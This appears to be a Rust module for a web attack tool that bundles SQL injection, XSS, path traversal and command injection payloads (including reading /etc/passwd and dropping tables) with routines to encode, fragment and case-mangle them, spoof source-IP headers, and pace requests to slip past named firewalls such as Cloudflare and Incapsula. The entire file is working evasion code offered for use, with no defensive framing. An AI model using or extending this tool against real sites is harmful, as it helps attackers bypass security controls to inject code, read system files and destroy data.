use rand::Rng;
use std::time::Duration;
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use base64::{Engine as _, engine::general_purpose::STANDARD as Base64Engine};

pub struct WafEvasion {
    payloads: Vec<String>,
    encoding_methods: Vec<EncodingMethod>,
    rate_limit_patterns: Vec<RateLimitPattern>,
}

#[derive(Clone)]
pub enum EncodingMethod {
    Base64,
    UrlEncode,
    HtmlEncode,
    UnicodeEncode,
    DoubleUrlEncode,
    HexEncode,
}

#[derive(Clone)]
pub struct RateLimitPattern {
    pub requests_per_minute: u32,
    pub burst_size: u32,
    pub delay_pattern: DelayPattern,
}

#[derive(Clone)]
pub enum DelayPattern {
    Fixed(Duration),
    RandomRange(Duration, Duration),
    Exponential(Duration),
    Fibonacci(Duration),
}

impl WafEvasion {
    pub fn new() -> Self {
        Self {
            payloads: Self::load_evasion_payloads(),
            encoding_methods: vec![
                EncodingMethod::Base64,
                EncodingMethod::UrlEncode,
                EncodingMethod::HtmlEncode,
                EncodingMethod::UnicodeEncode,
                EncodingMethod::DoubleUrlEncode,
                EncodingMethod::HexEncode,
            ],
            rate_limit_patterns: Self::generate_rate_limit_patterns(),
        }
    }

    // Load various payload encoding techniques
    fn load_evasion_payloads() -> Vec<String> {
        vec![
            // SQL Injection evasion payloads
            "' OR '1'='1".to_string(),
            "'; DROP TABLE users; --".to_string(),
            "1' UNION SELECT NULL--".to_string(),
            
            // XSS evasion payloads
            "<script>alert('xss')</script>".to_string(),
            "javascript:alert(1)".to_string(),
            "<img src=x onerror=alert(1)>".to_string(),
            
            // Path traversal
            "../../../etc/passwd".to_string(),
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts".to_string(),
            
            // Command injection
            "; cat /etc/passwd".to_string(),
            "| whoami".to_string(),
            "&& dir".to_string(),
        ]
    }

    // Generate different rate limiting patterns
    fn generate_rate_limit_patterns() -> Vec<RateLimitPattern> {
        vec![
            RateLimitPattern {
                requests_per_minute: 30,
                burst_size: 5,
                delay_pattern: DelayPattern::Fixed(Duration::from_secs(2)),
            },
            RateLimitPattern {
                requests_per_minute: 60,
                burst_size: 10,
                delay_pattern: DelayPattern::RandomRange(
                    Duration::from_millis(500),
                    Duration::from_secs(3)
                ),
            },
            RateLimitPattern {
                requests_per_minute: 120,
                burst_size: 15,
                delay_pattern: DelayPattern::Exponential(Duration::from_millis(100)),
            },
        ]
    }

    // Encode payload using various methods
    pub fn encode_payload(&self, payload: &str, method: &EncodingMethod) -> String {
        match method {
            EncodingMethod::Base64 => Base64Engine.encode(payload),
            EncodingMethod::UrlEncode => urlencoding::encode(payload).to_string(),
            EncodingMethod::HtmlEncode => self.html_encode(payload),
            EncodingMethod::UnicodeEncode => self.unicode_encode(payload),
            EncodingMethod::DoubleUrlEncode => {
                let first_encode = urlencoding::encode(payload);
                urlencoding::encode(&first_encode).to_string()
            },
            EncodingMethod::HexEncode => self.hex_encode(payload),
        }
    }

    // HTML encode special characters
    fn html_encode(&self, input: &str) -> String {
        input
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#x27;")
            .replace("/", "&#x2F;")
    }

    // Unicode encode characters
    fn unicode_encode(&self, input: &str) -> String {
        input.chars()
            .map(|c| format!("\\u{:04x}", c as u32))
            .collect()
    }

    // Hex encode characters
    fn hex_encode(&self, input: &str) -> String {
        input.bytes()
            .map(|b| format!("%{:02x}", b))
            .collect()
    }

    // Generate WAF-evading HTTP headers
    pub fn generate_evasion_headers(&self) -> HeaderMap {
        let mut headers = HeaderMap::new();
        let mut rng = rand::thread_rng();

        // Randomize HTTP methods in headers
        let methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"];
        if rng.gen_bool(0.3) {
            headers.insert("X-HTTP-Method-Override", 
                methods[rng.gen_range(0..methods.len())].parse().unwrap());
        }

        // Add header confusion techniques
        if rng.gen_bool(0.5) {
            headers.insert("X-Originating-IP", "127.0.0.1".parse().unwrap());
            headers.insert("X-Forwarded-For", "127.0.0.1".parse().unwrap());
            headers.insert("X-Remote-IP", "127.0.0.1".parse().unwrap());
            headers.insert("X-Remote-Addr", "127.0.0.1".parse().unwrap());
        }

        // Content-Type confusion
        let content_types = [
            "application/json",
            "application/xml",
            "text/plain",
            "multipart/form-data",
            "application/x-www-form-urlencoded",
        ];
        
        if rng.gen_bool(0.7) {
            headers.insert("Content-Type", 
                content_types[rng.gen_range(0..content_types.len())].parse().unwrap());
        }

        // Add custom headers to bypass WAF
        headers.insert("X-Real-IP", "192.168.1.1".parse().unwrap());
        headers.insert("X-Forwarded-Host", "localhost".parse().unwrap());
        headers.insert("X-Forwarded-Proto", "https".parse().unwrap());

        // Case manipulation for header names
        if rng.gen_bool(0.4) {
            self.add_case_manipulated_headers(&mut headers);
        }

        headers
    }

    // Add headers with case manipulation
    fn add_case_manipulated_headers(&self, headers: &mut HeaderMap) {
        let manipulated_headers = [
            ("user-agent", "WAFBypass/1.0"),
            ("x-forwarded-for", "127.0.0.1"),
            ("x-real-ip", "10.0.0.1"),
            ("x-forwarded-proto", "http"),
        ];

        for (name, value) in manipulated_headers.iter() {
            if let (Ok(header_name), Ok(header_value)) = 
                (HeaderName::from_bytes(name.as_bytes()), HeaderValue::from_str(value)) {
                headers.insert(header_name, header_value);
            }
        }
    }

    // Fragment payload to evade detection
    pub fn fragment_payload(&self, payload: &str, fragment_size: usize) -> Vec<String> {
        payload.chars()
            .collect::<Vec<char>>()
            .chunks(fragment_size)
            .map(|chunk| chunk.iter().collect())
            .collect()
    }

    // Apply smart rate limiting
    pub async fn apply_rate_limiting(&self, pattern: &RateLimitPattern, request_count: u32) {
        let delay = match &pattern.delay_pattern {
            DelayPattern::Fixed(duration) => *duration,
            DelayPattern::RandomRange(min, max) => {
                let mut rng = rand::thread_rng();
                let millis = rng.gen_range(min.as_millis()..=max.as_millis()) as u64;
                Duration::from_millis(millis)
            },
            DelayPattern::Exponential(base) => {
                Duration::from_millis(base.as_millis() as u64 * 2_u64.pow(request_count % 8))
            },
            DelayPattern::Fibonacci(base) => {
                let fib_multiplier = self.fibonacci(request_count as usize);
                Duration::from_millis(base.as_millis() as u64 * fib_multiplier)
            },
        };

        tokio::time::sleep(delay).await;
    }

    // Calculate Fibonacci number for delay
    fn fibonacci(&self, n: usize) -> u64 {
        match n {
            0 => 1,
            1 => 1,
            _ => {
                let mut a = 1u64;
                let mut b = 1u64;
                for _ in 2..=n {
                    let temp = a + b;
                    a = b;
                    b = temp;
                }
                b.min(10) // Cap at 10 to prevent extreme delays
            }
        }
    }

    // Generate multiple payload variations
    pub fn generate_payload_variations(&self, base_payload: &str) -> Vec<String> {
        let mut variations = Vec::new();
        
        // Original payload
        variations.push(base_payload.to_string());
        
        // Apply different encodings
        for method in &self.encoding_methods {
            variations.push(self.encode_payload(base_payload, method));
        }
        
        // Case variations
        variations.push(base_payload.to_uppercase());
        variations.push(base_payload.to_lowercase());
        
        // Mixed case
        variations.push(self.mixed_case(base_payload));
        
        // Add padding
        variations.push(format!("  {}  ", base_payload));
        variations.push(format!("\t{}\n", base_payload));
        
        // Comment insertion (for SQL)
        if base_payload.contains("SELECT") || base_payload.contains("UNION") {
            variations.push(base_payload.replace(" ", "/**/"));
        }
        
        variations
    }

    // Create mixed case version of string
    fn mixed_case(&self, input: &str) -> String {
        let mut rng = rand::thread_rng();
        input.chars()
            .map(|c| {
                if rng.gen_bool(0.5) {
                    c.to_uppercase().collect::<String>()
                } else {
                    c.to_lowercase().collect::<String>()
                }
            })
            .collect()
    }

    // Check if response indicates WAF blocking
    pub fn is_waf_blocked(&self, response_text: &str, status_code: u16) -> bool {
        // Common WAF block indicators
        let waf_indicators = [
            "blocked by security policy",
            "access denied",
            "forbidden",
            "security violation",
            "suspicious activity",
            "rate limit exceeded",
            "cloudflare",
            "incapsula",
            "sucuri",
            "wordfence",
        ];

        let text_lower = response_text.to_lowercase();
        let has_waf_text = waf_indicators.iter().any(|&indicator| text_lower.contains(indicator));
        
        // Check HTTP status codes
        let blocked_status = matches!(status_code, 403 | 406 | 429 | 503);
        
        has_waf_text || blocked_status
    }

    // Get optimal rate limiting pattern based on target
    pub fn get_optimal_pattern(&self, target_type: WafType) -> &RateLimitPattern {
        match target_type {
            WafType::Cloudflare => &self.rate_limit_patterns[0], // Conservative
            WafType::Incapsula => &self.rate_limit_patterns[1],  // Moderate
            WafType::Generic => &self.rate_limit_patterns[2],    // Aggressive
        }
    }
}

pub enum WafType {
    Cloudflare,
    Incapsula,
    Generic,
}

// URL encoding helper (placeholder for actual implementation)
mod urlencoding {
    pub fn encode(input: &str) -> std::borrow::Cow<str> {
        // Simplified URL encoding
        input.chars()
            .map(|c| match c {
                'A'..='Z' | 'a'..='z' | '0'..='9' | '-' | '_' | '.' | '~' => c.to_string(),
                _ => format!("%{:02X}", c as u8),
            })
            .collect::<String>()
            .into()
    }
}
